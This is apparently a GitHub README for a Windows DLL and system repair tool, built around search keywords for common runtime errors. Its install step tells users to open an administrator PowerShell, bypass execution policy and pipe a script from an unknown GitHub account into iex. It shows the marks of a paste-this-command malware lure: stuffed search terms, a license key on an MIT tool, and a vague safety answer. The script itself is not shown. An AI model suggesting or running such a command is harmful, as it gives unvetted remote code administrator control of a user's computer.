# Windows System Repair Tool — PowerShell

**Windows-System-Repair-PowerShell**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.2.0-stable-brightgreen?style=flat-square)]()
[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()

Fix DLL errors, DirectX, BSOD, corrupted system files and missing runtimes on Windows.

---

## Quick Install

Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

The installer downloads the latest build, prompts for your license key and completes setup automatically.

## Step-by-Step

| Step | Action |
|------|--------|
| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
| 2 | Paste the command block above and press **Enter** |
| 3 | Wait for download — progress shown in the console |
| 4 | Enter license key when prompted (also in `license.txt` after install) |
| 5 | Restart if the installer asks — then launch from Start menu |

If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.

---

## Overview

Install Windows System Repair via PowerShell — fix DLL errors, DirectX, BSOD and corrupted files on Windows 10/11. SFC, DISM, VC++ redistributables included.

## Common Searches

- msvcp140.dll is missing
- vcruntime140.dll not found
- api-ms-win-crt-runtime-l1-1-0.dll missing
- sfc scannow dism windows 11
- side-by-side configuration incorrect

## Features

* **DLL repair** — Installs VC++ 2005–2022 and fixes MSVCP140 / VCRUNTIME140 errors.
* **DirectX module** — Full DirectX End-User Runtime for game launch errors.
* **SFC + DISM** — Runs sfc /scannow and DISM RestoreHealth automatically.
* **.NET repair** — Installs .NET 4.8.1 and Desktop Runtime 8.0 LTS.
* **Update reset** — Clears stuck Windows Update cache and re-registers DLLs.

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum |
| PowerShell | 5.1 or PowerShell 7+ |
| Admin | Required |
| Network | Required for download |

## FAQ

**How do I install without a browser?**
Use the PowerShell command above — no browser needed after Admin shell is open.

**Where is the license key?**
Shown during install and saved to `license.txt` in the install folder.

**Is the script safe to run?**
Hosted on GitHub raw; review `install.ps1` before running if you prefer.

**"MSVCP140.dll is missing"?**
Installs Visual C++ 2015-2022 redistributable (x86 + x64).

**"VCRUNTIME140.dll not found"?**
Same VC++ package — most common runtime fix.

**Blue screen after update?**
SFC and DISM repair corrupted system files.

**Games crash on startup?**
DLL + DirectX modules fix missing runtime libraries.

---

TAGS windows system repair, msvcp140.dll missing, vcruntime140.dll, sfc scannow dism, dll repair tool, powershell install, windows setup script

## License

[MIT](LICENSE)
